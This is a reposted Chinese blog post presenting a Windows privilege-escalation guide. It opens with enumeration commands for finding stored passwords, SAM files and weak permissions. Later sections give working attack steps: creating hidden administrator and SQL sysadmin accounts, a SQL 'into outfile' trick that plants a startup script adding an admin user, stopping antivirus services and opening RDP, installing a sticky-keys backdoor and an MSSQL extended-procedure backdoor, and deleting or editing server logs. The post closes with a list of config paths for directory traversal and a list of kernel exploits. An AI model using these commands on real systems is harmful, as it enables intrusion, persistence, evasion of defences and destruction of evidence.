---
layout: default
title: Win提权思路，方法，工具（小总结）[转]
category: [技术, powershell]
comments: true
---

# Win提权思路，方法，工具（小总结）[转]
看到这个文章,感觉整理的不错,就收藏下了.




## 介绍

windows提权总是被归结为适当的枚举。但要完成适当的枚举，你需要知道要检查和查找的内容。这通常需要伴随着经验的丰富而对系统非常熟悉。起初特权升级看起来像是一项艰巨的任务，但过了一段时间，你就开始过滤哪些是正常的东西，而哪些不是正常的东西。最终变得更容易，因为你知道要寻找什么了，而不是挖掘希望在干草堆中找到那根针的所有东西。希望本指南能为你的入门提供良好的基础知识。

所以本指南主要集中在枚举方面。

注：我不是专家，仍然在学习当中。

## 指南概述

在每个部分中，我首先提供老的可靠的CMD命令，然后是一个Powershell实现的的等价命令。同时拥有这两种工具是非常好的，Powershell比传统的CMD更加灵活。然而，没有一个Powershell命令能等价于所有东西（或者CMD在某些事情上仍然更简单更好），所以一些部分将只包含常规的CMD命令。

* 命令了解操作系统类型和架构？它是否缺少任何补丁？
``` 
systeminfo
wmic qfe
``` 

* 环境变量有什么有趣的地方吗？域控制器在LOGONSERVER？
``` 
set
Get-ChildItem Env: | ft Key,Value
``` 

* 有没有其他连接的驱动器？
``` 
net use
wmic logicaldisk get caption,description,providername
``` 
``` 
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
``` 

* 用户,你是谁？
``` 
whoami
echo %USERNAME%
$env:UserName
``` 

* 系统上有哪些用户？任何旧的用户配置文件没有被清理掉？
``` 
net users
dir /b /ad "C:\Users\"
dir /b /ad "C:\Documents and Settings\" # Windows XP and below
``` 
``` 
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
``` 
 

* 是否有其他人登录？
``` 
qwinsta
``` 

* 系统上有哪些用户组？
``` 
net localgroup
Get-LocalGroup | ft Name
``` 
 

* 在管理员组中有哪些用户？
``` 
net localgroup Administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
``` 
 

* 用户自动登录对应的注册表中有些什么内容？
``` 
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
``` 
 

* Credential Manager中有什么有趣的东西？
``` 
cmdkey /list
``` 

* 我们可以访问SAM和SYSTEM文件吗？
``` 
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
``` 
 

* 程序，进程和服务,系统都安装了些什么软件？
``` 
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE
``` 
``` 
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
``` 
 

* 有没有权限设置的比较脆弱的文件夹或文件的权限？在程序文件夹中（Program Folders）有哪些文件或文件夹赋予了所有人（Everyone）或用户（User）的完全权限？
``` 
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
``` 
 

* 修改程序文件夹（Program Folders）中的所有人（Everyone）或用户（User）的权限？
``` 
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
``` 
``` 
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
``` 
 

* 你也可以上传Sysinternals中的accesschk来检查可写文件夹和文件。
``` 
accesschk.exe -qwsu "Everyone" *
accesschk.exe -qwsu "Authenticated Users" *
accesschk.exe -qwsu "Users" *
``` 
 

* 系统上正在运行的进程/服务有哪些？有没有暴露的内部服务？如果是这样，我们可以打开它吗？请参阅附录中的端口转发。
``` 
tasklist /svc
tasklist /v
net start
sc query
``` 
``` 
Get-Process | ft ProcessName,Id
Get-Service
``` 
 

* 是否存在任何脆弱的服务权限？我们可以重新配置什么吗？你可以再次上传accesschk来检查权限。
``` 
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
``` 
 

* 有没有引用的服务路径？
``` 
wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """
``` 

* 是否设置了计划任务？任何自定义实现的计划任务？
``` 
schtasks /query /fo LIST 2>nul | findstr TaskName
dir C:\windows\tasks
``` 
``` 
Get-ScheduledTask | ft TaskName, State
``` 
 

* 系统启动时都运行了些什么？
``` 
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
``` 
``` 
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
``` 
 

* AlwaysInstallElevated是否启用？我没有跑过这个，但没有伤害检查。
``` 
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
``` 

* 网络连接到了哪一块网卡？是否有多个网络？
``` 
ipconfig /all
``` 
``` 
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
``` 
 

* 我们有哪些网络路线？
``` 
route print
``` 
``` 
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
``` 
 

* ARP缓存中有什么？
``` 
arp -a
``` 
``` 
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
``` 
 

* 是否有连接到其他主机的网络连接？
``` 
netstat -ano
``` 

* hosts文件中的有什么东西？
``` 
 C:\WINDOWS\System32\drivers\etc\hosts
``` 
* 防火墙是否打开？如果是又是怎样配置的？
``` 
netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule name=all
netsh advfirewall export "firewall.txt"
``` 
* 任何其他有趣的接口配置？
``` 
netsh dump
``` 
* 有没有SNMP配置？
``` 
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
``` 
``` 
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
``` 
## 有趣的文件和敏感信息

这部分内容的命令输出可能有点杂乱，所以你可能想把命令的输出重定向到txt文件中进行审查和解析。

* 在注册表中是否有任何密码？
``` 
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s
``` 

* 查看是否存在没有清理掉的sysprep或unattended文件？
``` 
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
``` 
``` 
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
``` 
* 如果服务器是IIS网络服务器，那么inetpub中有什么？以及任何隐藏的目录？web.config文件？
``` 
dir /a C:\inetpub\
dir /s web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
``` 
``` 
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
``` 
* 在IIS日志目录中有些什么文件？
``` 
C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\W3SVC2\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\FTPSVC1\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\FTPSVC2\u_ex[YYMMDD].log
``` 
* 是否安装了XAMPP，Apache或PHP？任何有XAMPP，Apache或PHP配置文件？
``` 
dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
``` 
``` 
Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue
``` 
* 系统中是否存在任何Apache网络日志？
``` 
dir /s access.log error.log
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
``` 
* 系统中是否任何有趣的文件？可能在用户目录（桌面，文档等）？
``` 
dir /s *pass* == *vnc* == *.config* 2>nulGet-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
``` 
* 系统中是否有包含密码的文件？
``` 
findstr /si password *.xml *.ini *.txt *.config 2>nul
``` 
``` 
Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
``` 

* cmd 下操作VPN 相关知识，资料：
``` 
#允许administrator拨入该VPN：
netsh ras set user administrator permit
#禁止administrator拨入该VPN：
netsh ras set user administrator deny
#查看哪些用户可以拨入VPN：
netsh ras show user
#查看VPN分配IP的方式：
netsh ras ip show config
#使用地址池的方式分配IP：
netsh ras ip set addrassign method = pool
#地址池的范围是从192.168.3.1到192.168.3.254：
netsh ras ip add range from = 192.168.3.1 to = 192.168.3.254
``` 
* Cmd、Dos 命令行下添加 SQL 用户的方法：
``` 
需要有管理员权限，在命令下先建立一个“c:\test.qry”文件，内容如下：
exec master.dbo.sp_addlogin test,123
EXEC sp_addsrvrolemember 'test, 'sysadmin'
然后在DOS下执行：cmd.exe /c isql -E /U alma /P /i c:\test.qry
``` 
另类的加用户方法：
在删掉了 net.exe 和不用 adsi 之外，新的加用户的方法。代码如下：
``` 
js:
var o=new ActiveXObject( "Shell.Users" );
z=o.create("test") ;
z.changePassword("123456","")
z.setting("AccountType")=3;
``` 
``` 
vbs:
view source
Set o=CreateObject( "Shell.Users" )
Set z=o.create("test")
z.changePassword "123456",""
z.setting("AccountType")=3
``` 

* Cmd 访问控制权限控制：

命令如下：
``` 
cacls c: /e /t /g everyone:F           #c盘everyone权限
cacls "目录" /d everyone               #everyone不可读，包括admin
``` 
备注：

反制方法，在文件夹安全设置里将 Everyone 设定为不可读，如果没有安全性选项：工具 – 文件夹选项 – 使用简单的共享去掉即可。

* 3389 相关，以下配合PR更好：

a、防火墙TCP/IP筛选.(关闭：net stop policyagent & net stop sharedaccess)

b、内网环境(lcx.exe)

c、终端服务器超出了最大允许连接(XP 运行：mstsc /admin;2003 运行：mstsc /console)

####1.查询终端端口：

REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
####2.开启XP&2003终端服务：

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
####3.更改终端端口为2008(十六进制为：0x7d8)：

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f

####4.取消xp&2003系统防火墙对终端服务的限制及IP连接的限制：

REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f
create table a (cmd text);

insert into a values ("set wshshell=createobject (""wscript.shell"")");

insert into a values ("a=wshshell.run (""cmd.exe /c net user admin admin /add"",0)");

insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup administrators admin /add"",0)");

select * from a into outfile "C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs";

BS马的PortMap功能，类似LCX做转发。若果支持ASPX，用这个转发会隐蔽点。(注：一直忽略了在偏僻角落的那个功能)

* 关闭常见杀软(把杀软所在的文件的所有权限去掉)：

处理变态诺顿企业版：

 

net stop "Symantec AntiVirus" /y
net stop "Symantec AntiVirus Definition Watcher" /y

net stop "Symantec Event Manager" /y

net stop "System Event Notification" /y

net stop "Symantec Settings Manager" /y

 

麦咖啡：

net stop "McAfee McShield"
Symantec病毒日志:

C:\Documents and Settings\All Users\Application Data\Symantec\Symantec Endpoint Protection\Logs
 

Symantec病毒备份:

C:\Documents and Settings\All Users\Application Data\Symantec\Symantec Endpoint Protection\Quarantine
 

Nod32病毒备份:

C:\Docume~1\Administrator\Local Settings\Application Data\ESET\ESET NOD32 Antivirus\Quarantine
Nod32移除密码保护:

删除“HKEY_LOCAL_MACHINE\SOFTWARE\ESET\ESET Security\CurrentVersion\Info\PackageID”即可

* 安装5次shift后门，沾滞键后门，替换SHIFT后门：

5次SHIFT，沾滞键后门：

copy %systemroot%\system32\sethc.exe %systemroot%\system32\dllcache\sethc1.exe
copy %systemroot%\system32\cmd.exe %systemroot%\system32\dllcache\sethc.exe /y

copy %systemroot%\system32\cmd.exe %systemroot%\system32\sethc.exe /y

替换SHIFT后门：

attrib c:\windows\system32\sethc.exe -h -r -s
attrib c:\windows\system32\dllcache\sethc.exe -h -r -s

del c:\windows\system32\sethc.exe

copy c:\windows\explorer.exe c:\windows\system32\sethc.exe

copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe

attrib c:\windows\system32\sethc.exe +h +r +s

attrib c:\windows\system32\dllcache\sethc.exe +h +r +s

添加隐藏系统账号：

1、执行命令：

“net user admin$ 123456 /add&net localgroup administrators admin$ /add”。
2、导出注册表SAM下用户的两个键值。

3、在用户管理界面里的 admin$ 删除，然后把备份的注册表导回去。

4、利用 Hacker Defender 把相关用户注册表隐藏。

安装 MSSQL 扩展后门：

USE master;
EXEC sp_addextendedproc 'xp_helpsystem', 'xp_helpsystem.dll';

GRANT exec On xp_helpsystem TO public;

处理服务器MSFTP日志：

在“C:\WINNT\system32\LogFiles\MSFTPSVC1\”下有 ex011120.log / ex011121.log / ex011124.log 三个文件，直接删除 ex0111124.log 不成功，显示“原文件…正在使用”。

当然可以直接删除“ex011120.log / ex011121.log”。然后用记事本打开“ex0111124.log”，删除里面的一些内容后，保存，覆盖退出，成功。

当停止“msftpsvc”服务后可直接删除“ex011124.log”。

MSSQL查询分析器连接记录清除：

MSSQL 2000 位于注册表如下：

HKEY_CURRENT_USER\Software\Microsoft\Microsoft SQL Server\80\Tools\Client\PrefServers

找到接接过的信息删除。

MSSQL 2005 是在：

C:\Documents and Settings\\Application Data\Microsoft\Microsoft SQL Server\90\Tools\Shell\mru.dat

## 各种网站的配置文件相对路径大全：
``` 
/config.php
../../config.php

../config.php

../../../config.php

/config.inc.php

./config.inc.php

../../config.inc.php

../config.inc.php

../../../config.inc.php

/conn.php

./conn.php

../../conn.php

../conn.php

../../../conn.php

/conn.asp

./conn.asp

../../conn.asp

../conn.asp

../../../conn.asp

/config.inc.php

./config.inc.php

../../config.inc.php

../config.inc.php

../../../config.inc.php

/config/config.php

../../config/config.php

../config/config.php

../../../config/config.php

/config/config.inc.php

./config/config.inc.php

../../config/config.inc.php

../config/config.inc.php

../../../config/config.inc.php

/config/conn.php

./config/conn.php

../../config/conn.php

../config/conn.php

../../../config/conn.php

/config/conn.asp

./config/conn.asp

../../config/conn.asp

../config/conn.asp

../../../config/conn.asp

/config/config.inc.php

./config/config.inc.php

../../config/config.inc.php

../config/config.inc.php

../../../config/config.inc.php

/data/config.php

../../data/config.php

../data/config.php

../../../data/config.php

/data/config.inc.php

./data/config.inc.php

../../data/config.inc.php

../data/config.inc.php

../../../data/config.inc.php

/data/conn.php

./data/conn.php

../../data/conn.php

../data/conn.php

../../../data/conn.php

/data/conn.asp

./data/conn.asp

../../data/conn.asp

../data/conn.asp

../../../data/conn.asp

/data/config.inc.php

./data/config.inc.php

../../data/config.inc.php

../data/config.inc.php

../../../data/config.inc.php

/include/config.php

../../include/config.php

../include/config.php

../../../include/config.php

/include/config.inc.php

./include/config.inc.php

../../include/config.inc.php

../include/config.inc.php

../../../include/config.inc.php

/include/conn.php

./include/conn.php

../../include/conn.php

../include/conn.php

../../../include/conn.php

/include/conn.asp

./include/conn.asp

../../include/conn.asp

../include/conn.asp

../../../include/conn.asp

/include/config.inc.php

./include/config.inc.php

../../include/config.inc.php

../include/config.inc.php

../../../include/config.inc.php

/inc/config.php

../../inc/config.php

../inc/config.php

../../../inc/config.php

/inc/config.inc.php

./inc/config.inc.php

../../inc/config.inc.php

../inc/config.inc.php

../../../inc/config.inc.php

/inc/conn.php

./inc/conn.php

../../inc/conn.php

../inc/conn.php

../../../inc/conn.php

/inc/conn.asp

./inc/conn.asp

../../inc/conn.asp

../inc/conn.asp

../../../inc/conn.asp

/inc/config.inc.php

./inc/config.inc.php

../../inc/config.inc.php

../inc/config.inc.php

../../../inc/config.inc.php

/index.php

./index.php

../../index.php

../index.php

../../../index.php

/index.asp

./index.asp

../../index.asp

../index.asp

../../../index.asp
``` 

## 大牛总结的Window提权Exp合集

漏洞列表
``` 
 #Security Bulletin   #KB     #Description    #Operating System
CVE-2017-0213 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)

MS17-010 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP)

MS16-135 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(2016)

MS16-098 　[KB3178466]　　[Kernel Driver]　　(Win 8.1)

MS16-075 　[KB3164038]　　[Hot Potato]　　(2003/2008/7/8/2012)

MS16-032 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012)

MS16-016 　[KB3136041]　　[WebDAV]　　(2008/Vista/7)

MS15-097 　[KB3089656]　　[remote code execution]　　(win8.1/2012)

MS15-076 　[KB3067505]　　[RPC]　　(2003/2008/7/8/2012)

MS15-077 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/2000/2003/2008/2012)

MS15-061 　[KB3057839]　　[Kernel Driver]　　(2003/2008/7/8/2012)

MS15-051 　[KB3057191]　　[Windows Kernel Mode Drivers]　　(2003/2008/7/8/2012)

MS15-010 　[KB3036220]　　[Kernel Driver]　　(2003/2008/7/8)

MS15-015 　[KB3031432]　　[Kernel Driver]　　(Win7/8/8.1/2012/RT/2012 R2/2008 R2)

MS15-001 　[KB3023266]　　[Kernel Driver]　　(2008/2012/7/8)

MS14-070 　[KB2989935]　　[Kernel Driver]　　(2003)

MS14-068 　[KB3011780]　　[Domain Privilege Escalation]　　(2003/2008/2012/7/8)

MS14-058 　[KB3000061]　　[Win32k.sys]　　(2003/2008/2012/7/8)

MS14-040 　[KB2975684]　　[AFD Driver]　　(2003/2008/2012/7/8)

MS14-002 　[KB2914368]　　[NDProxy]　　(2003/XP)

MS13-053 　[KB2850851]　　[win32k.sys]　　(XP/Vista/2003/2008/win 7)

MS13-046 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/2003/2008/2012/7)

MS13-005 　[KB2778930]　　[Kernel Mode Driver]　　(2003/2008/2012/win7/8)

MS12-042 　[KB2972621]　　[Service Bus]　　(2008/2012/win7)

MS12-020 　[KB2671387]　　[RDP]　　(2003/2008/7/XP)

MS11-080 　[KB2592799]　　[AFD.sys]　　(2003/XP)

MS11-062 　[KB2566454]　　[NDISTAPI]　　(2003/XP)

MS11-046 　[KB2503665]　　[AFD.sys]　　(2003/2008/7/XP)

MS11-011 　[KB2393802]　　[kernel Driver]　　(2003/2008/7/XP/Vista)

MS10-092 　[KB2305420]　　[Task Scheduler]　　(2008/7)

MS10-065 　[KB2267960]　　[FastCGI]　　(IIS 5.1, 6.0, 7.0, and 7.5)

MS10-059 　[KB982799]　　 [ACL-Churraskito]　　(2008/7/Vista)

MS10-048 　[KB2160329]　　[win32k.sys]　　(XP SP2 & SP3/2003 SP2/Vista SP1 & SP2/2008 Gold & SP2 & R2/Win7)

MS10-015 　[KB977165]　　 [KiTrap0D]　　(2003/2008/7/XP)

MS09-050 　[KB975517]　　 [Remote Code Execution]　　(2008/Vista)

MS09-020 　[KB970483]　　 [IIS 6.0]　　(IIS 5.1 and 6.0)

MS09-012 　[KB959454]　　 [Chimichurri]　　(Vista/win7/2008/Vista)

MS08-068 　[KB957097]　　 [Remote Code Execution]　　(2000/XP)

MS08-067 　[KB958644]　　 [Remote Code Execution]　　(Windows 2000/XP/Server 2003/Vista/Server 2008)

MS08-025 　[KB941693]　　 [Win32.sys]　　(XP/2003/2008/Vista)

MS06-040 　[KB921883]　　 [Remote Code Execution]　　(2003/xp/2000)

MS05-039 　[KB899588]　　 [PnP Service]　　(Win 9X/ME/NT/2000/XP/2003)

MS03-026 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/2000/XP/2003)
``` 
项目下载地址<https://github.com/SecWiki/windows-kernel-exploits>
文章内容50%来源于
<https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/>


## 参考的博客
Win提权思路，方法，工具（小总结） | 华盟网
<https://www.77169.com/html/196214.html>




